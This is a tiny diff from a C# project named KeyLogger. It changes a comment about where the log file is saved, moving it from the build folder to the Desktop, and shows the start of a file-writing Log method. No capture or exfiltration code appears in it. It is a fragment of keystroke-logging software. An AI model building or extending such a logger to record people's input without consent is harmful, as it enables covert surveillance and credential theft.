@@ -52,7 +52,7 @@ namespace KeyLogger
 
         }
         //default path for log.txt
-        //--> KeyLogger\KeyLogger\bin\Debug\logs.txt
+        //--> Desktop\logs.txt
         private static void Log(string log)
         {
             if (File.Exists(folderPath))
